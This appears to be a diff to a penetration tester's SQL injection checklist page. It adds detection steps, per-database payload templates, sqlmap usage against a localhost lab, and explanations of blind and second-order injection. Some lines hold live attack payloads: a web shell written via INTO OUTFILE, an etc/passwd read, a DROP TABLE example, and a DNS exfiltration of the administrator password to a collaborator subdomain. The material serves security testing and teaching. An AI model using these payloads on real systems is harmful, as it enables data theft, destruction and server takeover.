@@ -1,4 +1,140 @@
+---
+description: >-
+  Mostly SQL injection vulnerabilities can be found using modern scanners.
+  However, for more complex scenarios such as second-order SQLi, manual testing
+  can also be used.
+---
+
 # SQLi
+
+## Detection
+
+The goal with many of these tests is to invoke some behaviour change in the application. Be sure to closely monitor for:
+
+* [ ] Content-Length header changes
+* [ ] Error messages
+* [ ] Changes in the data returned
+* [ ] Delays
+* [ ] Second-order (i.e. you inject somewhere, but another interaction is required to trigger the payload)
+
+#### Test cases:
+
+* [ ] Test with single and double quotes
+* [ ] Test with comments or terminators to mask the rest of the query
+* [ ] Test with other special characters that can manipulate SQL statements
+* [ ] Test with boolean conditions `and 1=1` and `and 1=2` (closely monitor the application response, in particular the Content-Length header)
+* [ ] Test with functions that cause time delays
+  * [ ] MySQL `sleep(5)`
+  * [ ] PostgreSQL `pg_sleep(5)`
+  * [ ] MS SQL Server `WAITFOR DELAY '0:0:05'`
+  * [ ] Oracle `dbms_pipe.receive_message(('x'),5)`
+* [ ] Test with out-of-band (OOB) or out-of-band application security testing (OAST) techniques
+* [ ] Test for stacked queries
+* [ ] Test for `UNION` keyword
+  * [ ] `SELECT username,password FROM users UNION SELECT null,null`
+  * [ ] Test for the number of columns using `null,null` or `ORDER BY 1` , `ORDER BY 2`
+  * [ ] Test the data types with `'a',1` etc
+* [ ] Test with different encoding techniques
+* [ ] Test evasion techniques
+  * [ ] Test with encoded payloads
+  * [ ] Test with builting functions
+    * [ ] E.g. `CHAR()`
+  * [ ] Test ways to bypass commonly filtered characters
+    * [ ] E.g. replacing space with `/**/`
+
+#### Detection syntax
+
+**General**
+
+```
+{payload}--
+{payload};--
+{payload}#
+'||{payload}--
+'||{payload}#
+"{payload}--
+"{payload}#
+' AND {payload}--
+' OR {payload}--
+' AND EXISTS({payload})--
+' OR EXISTS({payload})--
+```
+
+**MySQL**
+
+```
+' UNION ALL SELECT {payload}--
+' UNION SELECT {payload}--
+' OR (SELECT {payload}) IS NOT NULL--
+' OR (SELECT {payload}) IS NULL--
+'||{payload}--
+"||{payload}--
+'||(SELECT {payload})--
+"||(SELECT {payload})--
+```
+
+**PostgeSQL**
+
+```
+' UNION ALL SELECT {payload}--
+' UNION SELECT {payload}--
+' OR (SELECT {payload}) IS NOT NULL--
+' OR (SELECT {payload}) IS NULL--
+```
+
+**Oracle**
+
+```
+' UNION ALL SELECT {payload} FROM dual--
+' UNION SELECT {payload} FROM dual--
+' OR (SELECT {payload} FROM dual) IS NOT NULL--
+' OR (SELECT {payload} FROM dual) IS NULL--
+'||({payload})--
+'||{payload}||'--
+"||{payload}||"--
+'||(SELECT {payload} FROM dual)--
+```
+
+#### MSSQL
+
+```
+' UNION ALL SELECT {payload}--
+' UNION SELECT {payload}--
+' OR (SELECT {payload}) IS NOT NULL--
+' OR (SELECT {payload}) IS NULL--
+'+{payload}+
+"+{payload}+
+'+'+(SELECT {payload})+
+"+"+(SELECT {payload})+
+```
+
+#### Other Payloads
+
+```
+OR {payload}=1
+AND {payload}=1
+AND IF({payload}, SLEEP(5), 1)
+AND CASE WHEN {payload} THEN sleep(5) ELSE NULL END
+AND {payload}
+AND NOT {payload}
+AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('Error:',{payload},0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+```
+
+#### Tools:
+
+**SQLmap**
+
+The easiest way to get started with SQLmap is to either save a request to a file or copy a request as curl and change the curl command to sqlmap.
+
+<figure><img src="https://86304134-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F7lI1MQhaUuVEjnryWVD9%2Fuploads%2FpPGpQqWvSFx8k9WKoBYk%2Fsqli-copy-curl.png?alt=media&#x26;token=d980ee31-b7b2-4b4f-8b52-60851170b5d3" alt=""><figcaption><p>Copying a request as cURL</p></figcaption></figure>
+
+```shellscript
+# Original curl request
+curl 'http://localhost/labs/i0x01.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' -H 'Connection: keep-alive' -H 'Referer: http://localhost/labs/i0x01.php' -H 'Cookie: csrf0x02=jeremy' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'username=jeremy'
+
+# Update 'curl' to 'sqlmap' and optionally add sqlmap flags
+sqlmap 'http://localhost/labs/i0x01.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' -H 'Connection: keep-alive' -H 'Referer: http://localhost/labs/i0x01.php' -H 'Cookie: csrf0x02=jeremy' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'username=jeremy'
+```
 
 ## SQLi
 
@@ -8,7 +144,7 @@
 
 ### Common
 
-```
+```shellscript
 /?q=1
 /?q=1'
 /?q=1"
@@ -82,7 +218,72 @@ UNION SELECT LOAD_FILE ("etc/passwd")--
 UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 ```
 
-### **Blind SQLi**
+## Blind SQLi
+
+#### Blind SQL Injection
+
+Blind SQL injection (Blind SQLi) is a type of SQL injection attack where the attacker can exploit the database, but the application does not display the output. Instead, the attacker must "infer" data by sending payloads and observing the application's behavior or responses.
+
+**A simple example:**
+
+* A vulnearble webapp uses an API for its search to return the number of results found.
+* A user searches for a product, and the application returns with "X products found" without displaying product details.
+* The application uses the SQL query `SELECT COUNT(*) FROM products WHERE product_name LIKE '%{searchTerm}%'`.
+* An attacker could exploit this by injecting SQL conditions into the `{searchTerm}`.
+* For exmaple, searching for `laptop' AND 1=1-- -` returns "1 product found" and searching for `laptop' AND 1=2-- -` returns "0 products found", this behavior can be an indicator of a potential Blind SQLi vulnerability.
+
+Blind SQLi is more time-consuming than regular SQLi but is just as dangerous. It can lead to:
+
+* Sensitive data exposure
+* Data manipulation
+* Authentication bypass
+* Potential discovery of hidden data
+
+#### Other learning resources:
+
+* OWASP: [https://owasp.org/www-community/attacks/Blind\\\\\_SQL\\\\\_Injection](https://owasp.org/www-community/attacks/Blind/_SQL/_Injection)
+* SQLmap's guide on Blind SQLi: [http://sqlmap.org/](http://sqlmap.org/)
+* PenTestMonkey's Cheat Sheet: [http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+
+#### Writeups:
+
+#### Checklist:
+
+* [ ] Identify potential vulnerable points:
+  * [ ] URL parameters
+  * [ ] Form fields
+  * [ ] HTTP headers (e.g. cookies, user-agent)
+  * [ ] Hidden fields
+* [ ] Test for true/false conditions:
+  * [ ] Can you get a "true" condition? E.g., `' AND 1=1-- -`
+  * [ ] Can you get a "false" condition? E.g., `' AND 1=2-- -`
+* [ ] Time-based Blind SQLi:
+  * [ ] Introduce artificial delays using functions like `SLEEP()` or `BENCHMARK()`
+  * [ ] Measure response times
+* [ ] Error-based Blind SQLi:
+  * [ ] Test a divide by zero payload
+  * [ ] Can we trigger an error message?
+    * [ ] Can we use `CAST()` to trigger an error and view the data?
+* [ ] Content-based Blind SQLi:
+  * [ ] Check for changes in page content based on payloads
+* [ ] Out-of-band (OAST):
+  * [ ] Can we trigger a DNS query?
+  * [ ] Can we append some data to the subdomain of the URL to exfiltrate information?
+* [ ] Binary search based extraction:
+  * [ ] Exploit faster by dividing data and querying
+* [ ] Backend specifics:
+  * [ ] Are you dealing with MySQL, MSSQL, Oracle, PostgreSQL, SQLite?
+  * [ ] Adjust your payloads accordingly
+* [ ] Test with automated tools:
+  * [ ] SQLmap with `--technique=B` flag
+* [ ] Encoding and obfuscation:
+  * [ ] Test with URL encoding, hex encoding, or other methods to bypass filters
+* [ ] Bypassing filters:
+  * [ ] Use comments, spaces, or alternative syntax
+* [ ] Exploitation:
+  * [ ] Extract database version, e.g., `AND (SELECT SUBSTRING(version(),1,1))='5'`
+  * [ ] Fetch data character by character
+  * [ ] Extract data from information\_schema
 
 ```bash
 # Conditional Responses
@@ -133,7 +334,28 @@ TrackingId=x'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE
 TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-### **Second Order SQLi**
+## Second-order SQLi
+
+#### Second-order SQL Injection
+
+Second order SQL injection (also known as Stored SQL Injection) occurs when user input is first stored in the database, and later used without being validated or encoded. The injection opportunity occurs in the second operation, hence the name "second order".
+
+**A simple example:**
+
+* A vulnerable webapp allows users to save their usernames.
+* An attacker can provide a malicious payload as their username, e.g. `jeremy'); DROP TABLE users;-- -`
+* Later, when the application tries to fetch the username for an operation (e.g., greeting a returning user), it executes the malicious payload.
+
+This type of attack can lead to:
+
+1. Data loss or corruption.
+2. Compromise of the database.
+3. Sensitive data exposure.
+4. Remote code execution.
+
+
+
+#### Checklist:
 
 ```bash
 # A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:
